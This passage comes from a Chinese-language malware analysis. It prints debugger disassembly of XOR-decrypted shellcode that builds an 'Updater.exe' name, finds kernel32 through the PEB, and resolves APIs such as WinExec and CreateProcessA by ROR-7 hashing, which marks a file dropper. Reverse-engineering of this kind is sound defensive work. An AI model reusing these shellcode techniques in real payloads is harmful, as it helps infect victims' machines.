
可以看出上面过程就是一段解密的代码，密钥是 `0x22`，算法就是 `XOR`，解完密的代码如下：

### Code_index6

代码:

```
033e0274 55              push    ebp
033e0275 8bec            mov     ebp,esp
033e0277 81ec1c060000    sub     esp,offset <Unloaded\_.dll>+0x61b (0000061c)
033e027d 53              push    ebx
033e027e 56              push    esi
033e027f 57              push    edi
033e0280 c745c801000000  mov     dword ptr [ebp-38h],offset <Unloaded\_.dll> (00000001)
033e0287 c745bc00000000  mov     dword ptr [ebp-44h],0
033e028e c745ac80000000  mov     dword ptr [ebp-54h],offset <Unloaded\_.dll>+0x7f (00000080)
033e0295 c78534feffff00000000 mov dword ptr [ebp-1CCh],0
033e029f c68524faffff55  mov     byte ptr [ebp-5DCh],55h
033e02a6 c68525faffff70  mov     byte ptr [ebp-5DBh],70h
033e02ad c68526faffff64  mov     byte ptr [ebp-5DAh],64h
033e02b4 c68527faffff61  mov     byte ptr [ebp-5D9h],61h
033e02bb c68528faffff74  mov     byte ptr [ebp-5D8h],74h
033e02c2 c68529faffff65  mov     byte ptr [ebp-5D7h],65h
033e02c9 c6852afaffff72  mov     byte ptr [ebp-5D6h],72h
033e02d0 c6852bfaffff2e  mov     byte ptr [ebp-5D5h],2Eh
033e02d7 c6852cfaffff65  mov     byte ptr [ebp-5D4h],65h
033e02de c6852dfaffff78  mov     byte ptr [ebp-5D3h],78h
033e02e5 c6852efaffff65  mov     byte ptr [ebp-5D2h],65h
//上述几个字符即为 Update.exe
//0:000> da 0c0bff98
0c0bff98  "Updater.exe....................."
0c0bffb8  "................................"
0c0bffd8  "................................"
0c0bfff8  "................................"
033e02ec 33c0            xor     eax,eax
033e02ee 89852ffaffff      mov     dword ptr [ebp-5D1h],eax
033e02f4 e9a2040000      jmp     <Unloaded\_.dll>+0x33e079a (033e079b)
033e02f9 5f              pop     edi
//上述过程即是在重定位
033e02fa 64a130000000    mov     eax,dword ptr fs:[<Unloaded\_.dll>+0x2f (00000030)]
033e0300 8b400c          mov     eax,dword ptr [eax+0Ch]
033e0303 8b701c          mov     esi,dword ptr [eax+1Ch]
033e0306 ad              lods    dword ptr [esi]
033e0307 8b5808          mov     ebx,dword ptr [eax+8]
//获取 kernel32 基址，似乎和第二阶段的 shellcode 功能重复
033e030a 8bf7            mov     esi,edi
033e030c 6a0c            push    0Ch
033e030e 59              pop     ecx
033e030f e826040000      call    <Unloaded\_.dll>+0x33e0739 (033e073a)
//0x033e073a 处的汇编代码见 Code_index6
033e0314 e2f9            loop    <Unloaded\_.dll>+0x33e030e (033e030f)
```

### Code_index7

```
033e073a 51              push    ecx
033e073b 56              push    esi
033e073c 8b733c          mov     esi,dword ptr [ebx+3Ch]
033e073f 8b741e78        mov     esi,dword ptr [esi+ebx+78h]
033e0743 03f3            add     esi,ebx
033e0745 56              push    esi
033e0746 8b7620          mov     esi,dword ptr [esi+20h]
033e0749 03f3            add     esi,ebx
033e074b 33c9            xor     ecx,ecx
033e074d 53              push    ebx
033e074e 49              dec     ecx
033e074f 41              inc     ecx
033e0750 ad              lods    dword ptr [esi]
033e0751 5b              pop     ebx
033e0752 03c3            add     eax,ebx
033e0754 53              push    ebx
033e0755 33db            xor     ebx,ebx
033e0757 0fbe10          movsx   edx,byte ptr [eax]
033e075a 3ad6            cmp     dl,dh
033e075c 7408            je      <Unloaded\_.dll>+0x33e0765 (033e0766)
033e075e c1cb07          ror     ebx,7
033e0761 03da            add     ebx,edx
033e0763 40              inc     eax
033e0764 ebf1            jmp     <Unloaded\_.dll>+0x33e0756 (033e0757)
033e0766 3b1f            cmp     ebx,dword ptr [edi]  ds:0023:033e07a0=b4ffafed
033e0768 75e5            jne     <Unloaded\_.dll>+0x33e074e (033e074f)
033e076a 5a              pop     edx
033e076b 5e              pop     esi
033e076c 8b5e24          mov     ebx,dword ptr [esi+24h]
033e076f 03da            add     ebx,edx
033e0771 668b0c4b        mov     cx,word ptr [ebx+ecx*2]
033e0775 8b5e1c          mov     ebx,dword ptr [esi+1Ch]
033e0778 03da            add     ebx,edx
033e077a 8b048b          mov     eax,dword ptr [ebx+ecx*4]
033e077d 03c2            add     eax,edx
033e077f 57              push    edi
033e0780 8dbdccffffff    lea     edi,[ebp-34h]
033e0786 8b4dc8          mov     ecx,dword ptr [ebp-38h]
033e0789 83c704          add     edi,4
033e078c e2fb            loop    <Unloaded\_.dll>+0x33e0788 (033e0789)
033e078e ab              stos    dword ptr es:[edi]
033e078f 5f              pop     edi
033e0790 83c704          add     edi,4
033e0793 8bda            mov     ebx,edx
033e0795 5e              pop     esi
033e0796 59              pop     ecx
033e0797 ff45c8          inc     dword ptr [ebp-38h]
033e079a c3              ret
```

上述代码均是在查找函数的地址，此处的代码作用和前面查找函数的功能相同，所以觉得这个 shellcode 貌似是拼凑起来似的，最终查找的结果如下：

### Data_index5

代码:

```
0c0c0544 7c80b55f kernel32!GetModuleFileNameA
0c0c0548 7c810b07 kernel32!GetFileSize
0c0c054c 7c810c1e kernel32!SetFilePointer
0c0c0550 7c801a28 kernel32!CreateFileA
0c0c0554 7c801812 kernel32!ReadFile
0c0c0558 7c810e17 kernel32!WriteFile
0c0c055c 7c809bd7 kernel32!CloseHandle
0c0c0560 7c8623ad kernel32!WinExec
0c0c0564 7c835de2 kernel32!GetTempPathA
0c0c0568 7c80236b kernel32!CreateProcessA
0c0c056c 7c80de85 kernel32!GetCurrentProcess
0c0c0570 7c801e1a kernel32!TerminateProcess
```

继续 `Code_index6(033e0316)` 处的反汇编代码如下：

代码:

```
